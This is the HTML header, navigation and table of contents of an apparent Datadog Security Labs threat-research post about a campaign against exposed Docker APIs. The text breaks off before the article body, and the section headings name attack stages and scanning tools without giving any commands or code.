



<!doctype html>
<html lang="en" itemtype="http://schema.org/Article">
  <head>
    <title>
  Attackers deploying new tactics in campaign targeting exposed Docker APIs |  Datadog Security Labs
</title>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="This post includes analysis of a new campaign by the threat actor behind Spinning YARN">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Attackers deploying new tactics in campaign targeting exposed Docker APIs">
    <meta name="twitter:site" content="@datadoghq">
    <meta name="twitter:creator" content="@datadoghq">
    <meta name="twitter:description" content="This post includes analysis of a new campaign by the threat actor behind Spinning YARN">
    <meta name="twitter:image" content="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_explode.png?w=1200&h=630&auto=format">
    <meta property="og:title" content="Attackers deploying new tactics in campaign targeting exposed Docker APIs |  Datadog Security Labs">
    <meta property="og:type" content="article" />
    <meta property="og:description" content="This post includes analysis of a new campaign by the threat actor behind Spinning YARN">
    <meta name="image" property="og:image" content="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_explode.png?w=1200&h=630&auto=format">
    
    <link rel="shortcut icon" href="https://datadog-securitylabs.imgix.net/img/favicon.ico" type="image/x-icon">
    <link rel="preload" href="/assets/styles/styles-OIRYMJBK.css" as="style">
    <link rel="stylesheet" href="/assets/styles/styles-OIRYMJBK.css">
    <script src="/assets/scripts/main-FCVU64VZ.js"></script>
    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-WDC8G6');</script>
    <!-- End Google Tag Manager -->
    <meta name="ahrefs-site-verification" content="0e44dd9fee3fa1de786252e6fb86532d521bdc9fd44f5a759b11280bfde666e0">
  </head>

  <body class="article" id="/articles/attackers-deploying-new-tactics-in-campaign-targeting-exposed-docker-apis/">
    
<nav
  x-data="{
    mobile: false,
    mobileOpen: false,
    reactOnResize() {
      if (window.innerWidth < 835) {
        this.mobile = true;
      } else {
        this.mobile = false;
        this.mobileOpen = false;
      }        
    }
  }"
  x-init="reactOnResize()"
  @resize.window.throttle.200ms="reactOnResize"
  class="navbar"
>
  <div class="navbar-container">

    <div class="navbar-logo-container">
      <a class="navbar-logo-link" href="https://securitylabs.datadoghq.com">
        <svg class="navbar-logo-desktop"  width="180" height="44" viewBox="0 0 180 44" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M14.6834 11.5604C16.2023 10.5233 18.1604 10.9316 17.8325 11.2433C17.2079 11.838 18.0391 11.6629 18.1286 12.7614C18.1949 13.5707 17.9305 14.0174 17.7037 14.2709C17.23 14.3334 16.6532 14.4494 15.9596 14.6749C15.5487 14.8081 15.1913 14.9567 14.8788 15.1058C14.7963 15.0514 14.7071 14.9866 14.6009 14.8946C13.5278 13.965 13.5635 12.3247 14.6834 11.5604ZM23.758 17.9673C24.0332 17.753 25.2862 17.3501 26.4461 17.2123C27.0551 17.1397 27.9223 17.0994 28.1084 17.2022C28.4755 17.4056 28.4759 18.0344 28.2243 18.6155C27.8587 19.4605 27.3392 20.3916 26.7527 20.4693C25.796 20.5954 24.8892 20.0772 23.8549 19.3029C23.4859 19.0273 23.2595 18.3539 23.758 17.9673ZM25.5045 9.75029C26.9183 10.4086 26.7334 11.6619 26.7721 12.3978C26.783 12.609 26.7795 12.7518 26.7617 12.8504C26.5655 12.7441 26.2561 12.6664 25.7665 12.6878C25.6219 12.694 25.4824 12.7107 25.3471 12.7324C24.826 12.453 24.514 11.9045 24.2294 11.3231C24.2031 11.2695 24.1829 11.2214 24.1639 11.1744C24.1558 11.1531 24.1453 11.1294 24.1387 11.11C24.1352 11.0999 24.1321 11.091 24.129 11.0809C23.972 10.5836 24.0767 10.4843 24.1441 10.331C24.212 10.1749 24.4678 10.0453 24.0906 9.91448C24.0581 9.90322 24.0166 9.89468 23.972 9.8877C24.2209 9.57757 24.9706 9.50188 25.5045 9.75029ZM17.7965 24.7356C16.2726 23.7555 14.6972 22.3508 14.0083 21.5741C13.8924 21.4868 13.9114 21.0994 13.9114 21.0994C14.5332 21.5838 17.1143 23.4303 19.8422 24.2733C20.804 24.5706 22.281 24.6832 23.5623 23.9554C24.5419 23.3992 25.7208 22.4304 26.4233 21.4325L26.552 21.6564C26.5473 21.8055 26.2228 22.5278 26.0588 22.8182C26.3562 22.9897 26.5787 23.0359 26.9098 23.1275L29.1699 22.7747C29.9797 21.4631 30.562 19.3473 29.9429 17.3344C29.5881 16.1797 27.7448 13.8807 27.6126 13.7534C27.1486 13.3082 27.6898 11.5852 26.7714 9.70733C25.7999 7.72079 23.2719 5.64809 22.1725 4.74603C22.497 4.9828 24.4904 5.78704 25.4184 6.90956C25.5053 6.79351 25.5417 6.19072 25.6216 6.03856C24.8237 4.9929 24.7617 3.13096 24.7617 2.63374C24.7617 1.72159 24.2977 0.687183 24.2977 0.687183C24.2977 0.687183 25.0967 1.31909 25.3025 2.40861C25.5456 3.69881 26.0654 4.71459 26.7524 5.57356C28.0522 7.19524 29.2253 8.02743 29.82 7.42852C30.5298 6.70812 29.1005 3.48844 27.2722 1.69093C25.1424 -0.404674 24.5834 -0.134135 23.3324 0.313398C22.3345 0.66894 21.7953 3.50746 19.1933 3.45118C18.7521 3.40033 17.6171 3.37161 17.0561 3.37665C17.3488 2.96793 17.5988 2.65237 17.5988 2.65237C17.5988 2.65237 16.7262 3.00326 15.983 3.44924L15.9249 3.36229C16.1761 2.83247 16.4459 2.49866 16.4459 2.49866C16.4459 2.49866 15.7489 2.91864 15.1127 3.42051C15.2286 2.789 15.6667 2.38727 15.6667 2.38727C15.6667 2.38727 14.7855 2.54757 13.6629 3.78343C12.3867 4.13199 12.0796 4.36216 11.0636 4.81241C9.41134 4.45143 8.63097 3.86882 7.8886 2.79599C7.32222 1.97738 6.31623 1.85318 5.28581 2.27587C3.78671 2.89846 1.8887 3.74889 1.8887 3.74889C1.8887 3.74889 2.50587 3.72521 3.15133 3.75354C2.26939 4.08813 1.4204 4.54847 1.4204 4.54847C1.4204 4.54847 1.83366 4.53372 2.34382 4.54303C1.99105 4.83608 1.79644 4.97582 1.46189 5.19823C0.654379 5.78433 0 6.46203 0 6.46203C0 6.46203 0.548546 6.21168 1.03972 6.07194C0.696247 6.86144 0.0147313 7.4421 0.139559 8.40859C0.260123 9.29162 1.34132 11.1081 2.73808 12.2237C2.85864 12.3207 4.76634 14.0864 6.20458 13.3613C7.6432 12.6374 8.20958 11.9912 8.44606 11.001C8.7244 9.86336 8.56585 9.00478 7.97311 6.53656C7.77734 5.72184 7.26756 4.04504 7.02061 3.24313L7.07605 3.20237C7.54629 4.19642 8.7496 6.81602 9.23496 8.57472C9.99245 11.3189 9.7552 12.7108 9.40902 13.2208C8.36504 14.7598 5.68705 14.9632 4.469 14.1101C4.28331 17.0647 4.94234 18.3653 5.16525 19.0205C5.0536 19.7735 5.54128 21.172 5.54128 21.172C5.54128 21.172 5.59672 20.5358 5.81963 20.2009C5.87933 20.9488 6.25536 21.8361 6.25536 21.8361C6.25536 21.8361 6.23288 21.2881 6.40423 20.8145C6.64535 21.2229 6.82291 21.3207 7.05047 21.6273C7.27802 22.4261 7.73663 23.0103 7.73663 23.0103C7.73663 23.0103 7.66104 22.5822 7.7029 22.1358C8.81938 23.2102 9.01166 24.7771 9.12331 25.9804C9.43577 29.2924 3.90921 31.9241 2.83771 33.9948C2.02594 35.2206 1.54058 37.1625 2.91485 38.3056C6.23831 41.0688 4.96211 41.8296 6.6252 43.0433C8.90661 44.7085 11.7629 43.9632 12.7348 42.6078C14.0881 40.7203 13.74 38.9394 13.2376 37.2747C12.8449 35.9725 11.7777 33.8093 10.4553 32.9717C9.10664 32.1162 7.79478 31.9555 6.68257 32.0708L6.7853 31.9528C8.38442 31.6345 10.0553 31.8104 11.2655 32.5894C12.639 33.4736 13.8951 34.99 14.5522 37.3131C15.2969 37.2068 15.4031 37.1586 16.0838 37.0616L14.5483 25.0931L17.7965 24.7356ZM18.6826 39.7365L18.5058 38.0768L21.9583 32.8027L25.8784 33.9496L29.2499 28.3126L33.2906 30.9815L36.3616 24.5348L37.4529 36.2754L18.6826 39.7365ZM37.4948 22.1291L25.1554 24.3687C24.85 24.7635 24.0944 25.4559 23.7308 25.6364C22.172 26.4224 21.1187 26.1946 20.2088 25.9578C19.6242 25.8091 19.2854 25.7253 18.7985 25.5068L15.7867 25.9205L17.615 41.1922L38.7528 37.3782L37.4948 22.1291Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M51.0036 28.7055H55.3629C59.4687 28.7055 61.5218 26.2904 61.5218 21.4568C61.5218 17.3428 59.4687 15.2837 55.3629 15.2837H51.0036V28.7055ZM55.9165 31.8904H47.3359V12.1108H55.9165C62.0978 12.1108 65.1922 15.2288 65.1922 21.4609C65.1922 28.4126 62.0978 31.8904 55.9165 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M69.0341 31.8904H65.2676L73.6702 12.1108H77.6147L86.1984 31.8904H82.2543L79.7631 26.4956H73.4233L74.682 23.3155H78.7944L75.555 15.8856L69.0341 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M84.1265 12.1108H99.1458V15.2913H93.4715V31.8904H89.8042V15.2913H84.1265V12.1108Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M101.031 31.8904H97.2646L105.667 12.1108H109.611L118.195 31.8904H114.248L111.756 26.4956H105.416L106.675 23.3155H110.788L107.548 15.8856L101.031 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M124.298 28.7055H128.658C132.763 28.7055 134.819 26.2904 134.819 21.4568C134.819 17.3428 132.763 15.2837 128.658 15.2837H124.298V28.7055ZM129.211 31.8904H120.63V12.1108H129.211C135.396 12.1108 138.487 15.2288 138.487 21.4609C138.487 28.4126 135.396 31.8904 129.211 31.8904Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M150.912 28.8433C154.896 28.8433 156.89 26.5436 156.89 21.9413C156.89 17.4112 154.896 15.1449 150.912 15.1449C146.823 15.1449 144.78 17.4112 144.78 21.9413C144.78 26.5436 146.823 28.8433 150.912 28.8433ZM140.971 22.0274C140.971 15.3198 144.286 11.9678 150.912 11.9678C157.437 11.9678 160.696 15.3198 160.696 22.0274C160.696 28.6953 157.437 32.0307 150.912 32.0307C144.579 32.0307 141.268 28.6953 140.971 22.0274Z" />
<path fill-rule="evenodd" clip-rule="evenodd" d="M176.002 23.885V28.5168C175.155 28.738 174.397 28.8467 173.731 28.8467C169.247 28.8467 167.006 26.4716 167.006 21.7238C167.006 17.3386 169.382 15.1486 174.134 15.1486C176.117 15.1486 177.962 15.5178 179.67 16.2568V12.9343C177.962 12.2911 176.025 11.9678 173.857 11.9678C166.752 11.9678 163.197 15.2173 163.197 21.7238C163.197 28.5929 166.69 32.0307 173.675 32.0307C176.078 32.0307 178.074 31.681 179.67 30.9784V20.6316H173.745L172.506 23.885H176.002Z" />
</svg>

        <svg class="navbar-logo-mobile"  width="29" height="32" viewBox="0 0 29 32" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M10.6801 8.40742C11.7847 7.65314 13.2088 7.95011 12.9703 8.17679C12.5161 8.60925 13.1205 8.48194 13.1857 9.28082C13.2339 9.86939 13.0416 10.1943 12.8767 10.3786C12.5321 10.4241 12.1126 10.5085 11.6082 10.6725C11.3094 10.7693 11.0494 10.8774 10.8222 10.9858C10.7621 10.9463 10.6973 10.8992 10.62 10.8323C9.83961 10.1562 9.86555 8.96324 10.6801 8.40742ZM17.2781 13.0644C17.4783 12.9086 18.3895 12.6156 19.2331 12.5154C19.676 12.4626 20.3067 12.4332 20.442 12.508C20.709 12.6559 20.7093 13.1133 20.5263 13.5358C20.2605 14.1504 19.8827 14.8276 19.4561 14.8841C18.7603 14.9758 18.1008 14.5989 17.3486 14.0358C17.0802 13.8354 16.9156 13.3456 17.2781 13.0644ZM18.5491 7.09223C19.5773 7.57099 19.4428 8.4825 19.471 9.01772C19.4789 9.17128 19.4764 9.27516 19.4634 9.34687C19.3207 9.26952 19.0958 9.21306 18.7397 9.22859C18.6345 9.2331 18.533 9.24524 18.4346 9.26105C18.0557 9.0578 17.8287 8.65893 17.6218 8.23606C17.6026 8.19711 17.5879 8.1621 17.5741 8.12794C17.5682 8.11242 17.5606 8.0952 17.5558 8.08108C17.5533 8.07374 17.551 8.06725 17.5488 8.05991C17.4346 7.6983 17.5107 7.62604 17.5598 7.51453C17.6091 7.40105 17.7952 7.30677 17.5208 7.21164C17.4972 7.20345 17.467 7.19724 17.4346 7.19216C17.6156 6.96661 18.1608 6.91156 18.5491 7.09223ZM12.9429 17.9895C11.8346 17.2767 10.6888 16.2551 10.1878 15.6903C10.1035 15.6268 10.1174 15.345 10.1174 15.345C10.5696 15.6973 12.4467 17.0402 14.4307 17.6533C15.1302 17.8696 16.2044 17.9514 17.1362 17.4221C17.8487 17.0176 18.706 16.313 19.2169 15.5872L19.3105 15.7501C19.3071 15.8585 19.0711 16.3839 18.9519 16.595C19.1681 16.7198 19.33 16.7534 19.5707 16.82L21.2144 16.5634C21.8034 15.6095 22.2269 14.0708 21.7766 12.6068C21.5187 11.767 20.178 10.095 20.0819 10.0024C19.7444 9.67867 20.138 8.42559 19.4701 7.05987C18.7636 5.61512 16.925 4.1077 16.1255 3.45166C16.3614 3.62386 17.8112 4.20876 18.4861 5.02514C18.5493 4.94073 18.5758 4.50234 18.6339 4.39168C18.0536 3.6312 18.0085 2.27706 18.0085 1.91545C18.0085 1.25207 17.671 0.49977 17.671 0.49977C17.671 0.49977 18.2521 0.959336 18.4018 1.75172C18.5786 2.69005 18.9567 3.4288 19.4563 4.0535C20.4016 5.2329 21.2548 5.83813 21.6873 5.40256C22.2035 4.87863 21.164 2.53705 19.8344 1.22977C18.2854 -0.294308 17.8788 -0.097553 16.969 0.227926C16.2433 0.486502 15.8511 2.55088 13.9588 2.50995C13.6379 2.47297 12.8124 2.45208 12.4044 2.45575C12.6173 2.1585 12.7992 1.929 12.7992 1.929C12.7992 1.929 12.1645 2.18419 11.624 2.50854L11.5817 2.4453C11.7644 2.05998 11.9607 1.81721 11.9607 1.81721C11.9607 1.81721 11.4537 2.12265 10.9911 2.48765C11.0754 2.02836 11.394 1.73619 11.394 1.73619C11.394 1.73619 10.7531 1.85278 9.93663 2.75159C9.00849 3.00508 8.7852 3.17248 8.04624 3.49993C6.84461 3.2374 6.27707 2.81369 5.73716 2.03344C5.32525 1.4381 4.59362 1.34776 3.84423 1.65518C2.75397 2.10797 1.3736 2.72646 1.3736 2.72646C1.3736 2.72646 1.82245 2.70924 2.29188 2.72985C1.65047 2.97318 1.03302 3.30798 1.03302 3.30798C1.03302 3.30798 1.33357 3.29725 1.7046 3.30402C1.44803 3.51715 1.3065 3.61878 1.06319 3.78053C0.475912 4.20678 0 4.69966 0 4.69966C0 4.69966 0.398943 4.51758 0.756158 4.41596C0.506361 4.99013 0.0107136 5.41244 0.101498 6.11534C0.189181 6.75754 0.975506 8.07865 1.99133 8.88995C2.07901 8.96052 3.46643 10.2447 4.51242 9.71734C5.55869 9.19087 5.97061 8.72086 6.14259 8.00074C6.34502 7.17335 6.22971 6.54893 5.79862 4.75386C5.65625 4.16133 5.2855 2.94185 5.1059 2.35864L5.14622 2.329C5.48821 3.05194 6.36335 4.95711 6.71633 6.23616C7.26724 8.23194 7.09469 9.24422 6.84292 9.61515C6.08366 10.7344 4.13603 10.8823 3.25018 10.2619C3.11514 12.4107 3.59443 13.3566 3.75655 13.8331C3.67535 14.3807 4.03003 15.3978 4.03003 15.3978C4.03003 15.3978 4.07034 14.9352 4.23246 14.6915C4.27588 15.2355 4.54936 15.8808 4.54936 15.8808C4.54936 15.8808 4.533 15.4822 4.65762 15.1378C4.83299 15.4348 4.96211 15.5059 5.12761 15.729C5.29311 16.3099 5.62664 16.7348 5.62664 16.7348C5.62664 16.7348 5.57166 16.4234 5.60211 16.0988C6.41409 16.8801 6.55394 18.0197 6.63513 18.8948C6.86238 21.3036 2.84307 23.2175 2.06379 24.7235C1.47341 25.615 1.12042 27.0273 2.11989 27.8586C4.53695 29.8682 3.60881 30.4215 4.81833 31.3042C6.47753 32.5152 8.55485 31.9733 9.26167 30.9875C10.2459 29.6147 9.99274 28.3196 9.62735 27.1089C9.34174 26.1618 8.56557 24.5886 7.60387 23.9794C6.62301 23.3572 5.66893 23.2404 4.86005 23.3242L4.93477 23.2384C6.09776 23.0069 7.31291 23.1348 8.19313 23.7014C9.19203 24.3444 10.1055 25.4473 10.5834 27.1368C11.125 27.0595 11.2023 27.0245 11.6973 26.9539L10.5806 18.2495L12.9429 17.9895ZM13.5871 28.8937L13.4585 27.6866L15.9694 23.8509L18.8204 24.6851L21.2724 20.5854L24.2111 22.5264L26.4446 17.8379L27.2382 26.3765L13.5871 28.8937ZM27.2691 16.0879L18.295 17.7167C18.0729 18.0038 17.5234 18.5074 17.2589 18.6387C16.1252 19.2103 15.3592 19.0446 14.6975 18.8724C14.2724 18.7643 14.0259 18.7033 13.6718 18.5444L11.4814 18.8453L12.8111 29.9519L28.184 27.1782L27.2691 16.0879Z"/>
</svg>

        <p class="navbar-logo-title">Security Labs</p>
      </a>
    </div>

    <div class="navbar-menu-container">
      <span x-cloak x-show="mobile " class="navbar-menu-icon-container">
        <span x-show="!mobileOpen" @click="mobileOpen = true">
          <svg class="navbar-menu-icon"  width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M29.3333 14.6667H2.66663V17.3334H29.3333V14.6667ZM29.3333 5.33337H2.66663V8.00004H29.3333V5.33337ZM29.3333 24H2.66663V26.6667H29.3333V24Z"/>
</svg>

        </span>
        <span x-show="mobileOpen" @click="mobileOpen = false">
          <svg class="navbar-menu-icon"  focusable="false" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M13.4143 12L21.4571 20.0429L20.0429 21.4571L12 13.4143L3.95713 21.4571L2.54288 20.0429L10.5858 12L2.54288 3.95713L3.95713 2.54288L12 10.5858L20.0429 2.54288L21.4571 3.95713L13.4143 12Z"/>
</svg>

        </span>
      </span>

      <div x-show="!mobile || (mobile && mobileOpen)" class="navbar-menu-list-container">
        <ul class="navbar-menu-list">
          
            <li class="navbar-menu-item  ">
  <a href="/articles/" title="ARTICLES" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">ARTICLES</span>
    
  </a>
</li>
          
            <li class="navbar-menu-item  ">
  <a href="/cloud-security-atlas/" title="CLOUD SECURITY ATLAS" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">CLOUD SECURITY ATLAS</span>
    
  </a>
</li>
          
            <li class="navbar-menu-item  ">
  <a href="/newsletters/" title="NEWSLETTER" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">NEWSLETTER</span>
    
  </a>
</li>
          
            <li class="navbar-menu-item  ">
  <a href="/about/" title="ABOUT" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">ABOUT</span>
    
  </a>
</li>
          
        </ul>
      </div>
    </div>

  </div>
</nav>
    
<header class="hero !bg-none !pb-15 !text-black">
  <div class="container">
    <p class="hero-category">emerging threats and vulnerabilities</p>

    <span class="block pb-1 tablet:pb-2 desktop:pb-3"></span>

    <h1 class="hero-title w-11/12">Attackers deploying new tactics in campaign targeting exposed Docker APIs</h1>

    <span class="block pb-4 tablet:pb-2 desktop:pb-3"></span>

    <p class="hero-date">June 13, 2024</p>

    <span class="block pb-6 tablet:pb-8 desktop:pb-9"></span>

    <ul class="badge-list">
      
      <li class="inline-flex">




<a href="/articles/?tag=threat_research" aria-label="threat research" class="inline-flex" data-custom-name="Search filter tag button">
  <span class="badge badge-clickable badge-clickable-purple">
    threat research
  </span>
</a></li>
      
    </ul>

    <span class="block pb-4 tablet:pb-6"></span>

    <div class="share-article">
  <ul class="flex gap-3 desktop:gap-4">
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fattackers-deploying-new-tactics-in-campaign-targeting-exposed-docker-apis%2F&amp;text=Attackers%20deploying%20new%20tactics%20in%20campaign%20targeting%20exposed%20Docker%20APIs" title="twitter" data-custom-name="Social link">
          <svg class="fill-blue-1 hover:fill-blue-2 active:fill-blue-1"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="20" cy="20" r="20"/>
<g clip-path="url(#clip0_37_5902)">
<path d="M32.9092 13.3016C32.01 13.693 31.0567 13.9458 30.0817 14.0513C31.1112 13.4379 31.8818 12.4703 32.2492 11.3299C31.2957 11.9088 30.2509 12.322 29.1592 12.5519C28.486 11.8187 27.6064 11.3066 26.6363 11.083C25.6662 10.8594 24.6511 10.9347 23.7247 11.2991C22.7983 11.6636 22.004 12.2999 21.4465 13.1245C20.8891 13.949 20.5945 14.9229 20.6017 15.9181C20.6016 16.2966 20.6444 16.6738 20.7292 17.0427C18.7718 16.9435 16.8571 16.4344 15.109 15.5484C13.361 14.6625 11.8185 13.4194 10.5817 11.8996C10.142 12.6499 9.91154 13.5042 9.91418 14.3737C9.90958 15.1884 10.1072 15.9916 10.4894 16.7112C10.8716 17.4309 11.4265 18.0445 12.1042 18.4971C11.3153 18.4784 10.5429 18.2674 9.85418 17.8823V17.9423C9.85385 19.0784 10.2464 20.1797 10.9654 21.0596C11.6843 21.9395 12.6855 22.5439 13.7992 22.7705C13.3763 22.8854 12.9399 22.9433 12.5017 22.9429C12.192 22.9434 11.883 22.9133 11.5792 22.8529C11.8923 23.8314 12.5041 24.6872 13.3287 25.3003C14.1532 25.9135 15.1492 26.2531 16.1767 26.2716C14.4307 27.64 12.2753 28.3819 10.0567 28.3783C9.67264 28.3676 9.28951 28.3351 8.90918 28.2808C11.1581 29.7303 13.7784 30.4983 16.4542 30.4925C25.5142 30.4925 30.4642 22.9954 30.4642 16.4879C30.4642 16.278 30.4642 16.0605 30.4642 15.8506C31.4253 15.1541 32.2534 14.2907 32.9092 13.3016Z" fill="white"/>
</g>
<defs>
<clipPath id="clip0_37_5902">
<rect width="24" height="19.5" fill="white" transform="translate(10 11)"/>
</clipPath>
</defs>
</svg>

          <span class="sr-only">twitter</span>
        </a>
      </li>
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fattackers-deploying-new-tactics-in-campaign-targeting-exposed-docker-apis%2F" title="reddit" data-custom-name="Social link">
          <svg class="fill-orange-3 hover:fill-orange-4 active:fill-orange-3"  width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M20 40C31.0457 40 40 31.0457 40 20C40 8.95431 31.0457 0 20 0C8.95431 0 0 8.95431 0 20C0 31.0457 8.95431 40 20 40Z"/>
<path d="M33.3304 20.0001C33.3318 19.4272 33.1645 18.8666 32.8493 18.3882C32.5341 17.9099 32.085 17.5349 31.558 17.3103C31.031 17.0856 30.4495 17.0211 29.8861 17.1249C29.3227 17.2287 28.8024 17.4961 28.39 17.8938C26.3985 16.4569 23.651 15.5278 20.5899 15.4202L21.9192 9.16929L26.2604 10.0914C26.2837 10.5985 26.4911 11.0797 26.8438 11.4447C27.1966 11.8098 27.6703 12.0336 28.1764 12.0743C28.6824 12.115 29.1858 11.9697 29.5923 11.6656C29.9988 11.3616 30.2805 10.9197 30.3844 10.4228C30.4883 9.92592 30.4075 9.40819 30.1569 8.96669C29.9064 8.52519 29.5034 8.19025 29.0235 8.02468C28.5436 7.85911 28.0199 7.87427 27.5504 8.06733C27.0809 8.26039 26.6979 8.61809 26.4734 9.07334L21.6267 8.04128C21.4914 8.01286 21.3503 8.03928 21.2345 8.11475C21.1186 8.19022 21.0375 8.30856 21.0088 8.44381L19.5251 15.4178C16.4195 15.5044 13.6299 16.4358 11.6103 17.8892C11.3036 17.5961 10.9366 17.3735 10.5349 17.2369C10.1332 17.1004 9.70661 17.0533 9.28482 17.0987C8.86303 17.1442 8.45627 17.2813 8.09295 17.5003C7.72963 17.7193 7.41853 18.0151 7.18137 18.3668C6.94422 18.7186 6.78674 19.1179 6.71994 19.5368C6.65314 19.9557 6.67863 20.3842 6.79463 20.7923C6.91063 21.2003 7.11434 21.5782 7.39153 21.8993C7.66871 22.2205 8.01268 22.4772 8.39941 22.6516C8.35065 22.9425 8.32406 23.2367 8.31984 23.5316C8.31984 28.0202 13.5433 31.657 19.9885 31.657C26.4336 31.657 31.6547 28.0202 31.6547 23.5316C31.6545 23.2385 31.6318 22.9459 31.5869 22.6563C32.1032 22.4296 32.5427 22.058 32.8522 21.5865C33.1616 21.1151 33.3277 20.564 33.3304 20.0001ZM13.3327 22.0829C13.3322 21.6704 13.4542 21.267 13.683 20.9238C13.9118 20.5806 14.2373 20.313 14.6183 20.1548C14.9993 19.9966 15.4186 19.955 15.8233 20.0352C16.2279 20.1154 16.5997 20.3138 16.8915 20.6053C17.1834 20.8968 17.3822 21.2684 17.4628 21.6729C17.5435 22.0775 17.5023 22.4969 17.3446 22.878C17.1868 23.2592 16.9196 23.585 16.5766 23.8142C16.2337 24.0434 15.8304 24.1658 15.4179 24.1658C14.8655 24.1652 14.3358 23.9456 13.945 23.5552C13.5541 23.1648 13.3339 22.6354 13.3327 22.0829ZM24.9498 27.5896C23.5293 29.0078 20.8029 29.1201 20.0025 29.1201C19.2021 29.1201 16.4757 29.0078 15.0552 27.5896C14.9537 27.4881 14.8967 27.3505 14.8967 27.207C14.8967 27.0635 14.9537 26.9258 15.0552 26.8243C15.1566 26.7229 15.2943 26.6658 15.4378 26.6658C15.5813 26.6658 15.7189 26.7229 15.8204 26.8243C16.7168 27.7207 18.6288 28.0389 20.0025 28.0389C21.3762 28.0389 23.2906 27.7207 24.1869 26.8243C24.2365 26.7714 24.2963 26.7291 24.3626 26.6998C24.4289 26.6704 24.5005 26.6548 24.573 26.6537C24.6455 26.6526 24.7175 26.666 24.7847 26.6933C24.8518 26.7206 24.9128 26.7612 24.964 26.8125C25.0152 26.8639 25.0556 26.925 25.0827 26.9923C25.1098 27.0595 25.123 27.1316 25.1217 27.2041C25.1204 27.2766 25.1045 27.3481 25.075 27.4143C25.0454 27.4805 25.0029 27.5402 24.9498 27.5896ZM24.5848 24.1681C24.1722 24.1686 23.7687 24.0466 23.4254 23.8177C23.0821 23.5887 22.8145 23.2631 22.6564 22.882C22.4983 22.5009 22.4568 22.0814 22.5372 21.6767C22.6176 21.272 22.8162 20.9002 23.108 20.6085C23.3997 20.3167 23.7715 20.1181 24.1762 20.0377C24.5809 19.9573 25.0004 19.9988 25.3815 20.1569C25.7626 20.315 26.0882 20.5827 26.3172 20.9259C26.5461 21.2692 26.6681 21.6727 26.6676 22.0853C26.6664 22.6373 26.4465 23.1664 26.0562 23.5567C25.6658 23.947 25.1368 24.1669 24.5848 24.1681Z" fill="white"/>
</svg>

          <span class="sr-only">reddit</span>
        </a>
      </li>
    
  </ul>
</div>
  </div>
</header>

  
    
    


    



<figure class="">
    <img
        srcset="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_explode.png?auto=format&amp;h=712&dpr=1.75 1x,
                    https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_explode.png?auto=format&amp;h=712&dpr=2&q=75 2x,
                    https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_explode.png?auto=format&amp;h=712&dpr=3&q=55 3x"
        src="https://datadog-securitylabs.imgix.net/img/emergingthreats_hero_explode.png?auto=format&amp;h=712&dpr=1.75"
        alt="Attackers Deploying New Tactics In Campaign Targeting Exposed Docker Apis"
        class="mx-auto max-h-[712px]"
        loading="eager"
    />
</figure>


  



    <main>
      
<div class="container py-8 tablet:py-12 desktop:py-15">
  <article class="grid grid-cols-12 desktop:gap-x-10 relative">
    <aside class="article-toc hidden desktop:flex desktop:flex-col desktop:justify-between desktop:col-span-4">
      

<nav class="article-toc-nav text-20 leading-28 text-gray-50">
  
    <div class="flex items-center mb-4">
      <span class="inline-block mr-2"><svg class="w-[18px] h-[18px] fill-black"  xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 192" width="192" height="192">
  <path d="M176,160H68V144H176Zm0-72H68v16H176Zm0-56H68V48H176ZM44,26H16V54H44Zm0,56H16v28H44Zm0,56H16v28H44Z"/>
</svg>
</span><p class="font-roboto-mono font-light uppercase text-sm">on this page<p>
    </div>
    <nav class="article-toc-nav" >
        <ul><li><a href="#key-points-and-observations">Key points and observations</a></li><li><a href="#attack-flow">Attack Flow</a></li><li><a href="#analysis-of-the-attack">Analysis of the attack</a><ul><li><a href="#initial-access">Initial Access</a></li><li><a href="#actions-on-objective">Actions on objective </a></li><li><a href="#registering-persistence">Registering persistence </a></li><li><a href="#resource-hijacking">Resource Hijacking</a></li></ul></li><li><a href="#lateral-movement">Lateral Movement </a><ul><li><a href="#ssh-stager-for-pnscan-masscan-and-a-custom-docker-discovery-utility">s.sh: Stager for pnscan, masscan, and a custom Docker discovery utility</a></li><li><a href="#additional-payloads">Additional payloads</a></li></ul></li><li><a href="#how-datadog-can-help">How Datadog can help</a></li><li><a href="#conclusion">Conclusion</a></li><li><a href="#indicators-of-compromise">Indicators of Compromise </a></li></ul>
      </nav>
